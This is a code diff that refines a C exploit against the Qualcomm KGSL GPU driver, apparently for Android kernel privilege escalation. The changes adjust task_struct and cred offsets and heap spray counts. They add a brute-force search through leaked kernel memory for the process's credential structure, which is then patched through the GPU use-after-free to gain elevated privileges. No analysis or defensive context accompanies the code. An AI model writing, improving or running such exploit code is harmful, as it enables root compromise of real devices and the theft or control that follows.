@@ -29,9 +29,9 @@
 
 #define OFFSET_PID           0x650
 #define OFFSET_TGID          0x658
-#define OFFSET_COMM          0x428
-#define OFFSET_CRED          0x2c0
-#define OFFSET_REAL_CRED     0x2c8
+#define OFFSET_COMM          0x818
+#define OFFSET_CRED          0x6b0
+#define OFFSET_REAL_CRED     0x6b8
 #define OFFSET_TASKS         0x3f0
 #define OFFSET_FLAGS         0x00
 #define OFFSET_STACK         0x08
@@ -124,9 +124,9 @@ uint8_t sig_num[] = {1, 3, 5, 7, 9};
 
 #define KGSL_IOC_TYPE 0x09
 #define FINDING 10
-#define SPRAY_COUNT 5500
+#define SPRAY_COUNT 5000
 #define SPRAY_COUNT_STEP 500
-#define SPRAY_COUNT_MAX 5500
+#define SPRAY_COUNT_MAX 5000
 #define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
 #define KGSL_USER_MEM_TYPE_ADDR 0x00000002U
 
@@ -1142,6 +1142,7 @@ static void safe_cred_patch(void)
 {
     uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
     int patched = 0;
+    uid_t my_uid = getuid();
 
     fprintf(stderr, "[CHILD] ============================================\n");
     fprintf(stderr, "[CHILD] Starting SHELLCODE INJECTION via UAF\n");
@@ -1191,21 +1192,47 @@ static void safe_cred_patch(void)
             }
         }
         
-        if (comm_off != -1) {
-            if (find_cred_pointers_near_comm(fd, task_va, big_task_data, 8192, comm_off, &cred_ptr, &real_cred_ptr)) {
-                fprintf(stderr, "[CHILD] Dynamic search FOUND cred_ptr=0x%lx\n", (unsigned long)cred_ptr);
-            }
+    if (comm_off != -1) {
+        if (find_cred_pointers_near_comm(fd, task_va, big_task_data, 8192, comm_off, &cred_ptr, &real_cred_ptr)) {
+            fprintf(stderr, "[CHILD] Dynamic search FOUND cred_ptr=0x%lx\n", (unsigned long)cred_ptr);
         }
         
         if (cred_ptr == 0) {
-            // Fallback to hardcoded offsets relative to comm if found
-            if (comm_off != -1) {
-                cred_ptr = *(uint64_t *)(big_task_data + comm_off - (OFFSET_COMM - OFFSET_CRED));
-                real_cred_ptr = *(uint64_t *)(big_task_data + comm_off - (OFFSET_COMM - OFFSET_REAL_CRED));
-                fprintf(stderr, "[CHILD] Using relative offsets from comm 0x%x -> cred_ptr=0x%lx\n", 
-                        comm_off, (unsigned long)cred_ptr);
+            // More aggressive search in the 8KB buffer
+            fprintf(stderr, "[CHILD] Searching for cred_ptr with ANY valid kernel pointer...\n");
+            for (int off = comm_off - 1024; off < comm_off + 1024; off += 8) {
+                if (off < 0 || off > 8192 - 8) continue;
+                uint64_t ptr = *(uint64_t *)(big_task_data + off);
+                if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                    // This is a kernel pointer. Could it be cred?
+                    uint8_t cred_check[64];
+                    if (gpu_read_task_struct(fd, ptr, cred_check, 64) == 0) {
+                        uint32_t usage = *(uint32_t *)(cred_check + 0x00);
+                        uint32_t uid = *(uint32_t *)(cred_check + 0x04);
+                        if (usage > 0 && usage < 1000 && uid == my_uid) {
+                            cred_ptr = ptr;
+                            fprintf(stderr, "[CHILD] Found cred_ptr 0x%lx at off 0x%x via brute force!\n", 
+                                    (unsigned long)cred_ptr, off);
+                            break;
+                        }
+                    }
+                }
             }
         }
+    }
+    
+    if (cred_ptr == 0) {
+        // Fallback to hardcoded relative to comm
+        if (comm_off != -1) {
+            // Try standard offsets
+            uint64_t standard_cred_off = comm_off - (0x818 - 0x6b0);
+            if (standard_cred_off > 0 && standard_cred_off < 8192 - 8) {
+                cred_ptr = *(uint64_t *)(big_task_data + standard_cred_off);
+                fprintf(stderr, "[CHILD] Using standard relative offset -> cred_ptr=0x%lx\n", 
+                        (unsigned long)cred_ptr);
+            }
+        }
+    }
 
         if (cred_ptr != 0 && (cred_ptr & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
             if (patch_cred_via_gpu(fd, cred_ptr, real_cred_ptr) == 0) {
@@ -1808,8 +1835,18 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
                 // Verify this is a task_struct and not spray_heap
                 int kptrs = analyze_uaf_page(bytes, current_va);
                 
-                if (kptrs < 10) {
-                    fprintf(stderr, "\n      [?] Found marker but K-PTRs=%d. Likely spray_heap, skipping...\n", kptrs);
+                // If marker is found, verify PID at OFFSET_PID
+                int pid_match = 0;
+                for (int i = 0; i < 4096 - 4; i++) {
+                    if (*(int*)(bytes + i) == comm_pid) {
+                        // Potential OFFSET_PID
+                        pid_match = 1;
+                        break;
+                    }
+                }
+
+                if (kptrs < 5 && !pid_match) {
+                    fprintf(stderr, "\n      [?] Found marker but K-PTRs=%d and no PID match. Likely spray_heap, skipping...\n", kptrs);
                     current_va += PAGE_SIZE * SCAN_PAGE_STEP;
                     continue;
                 }
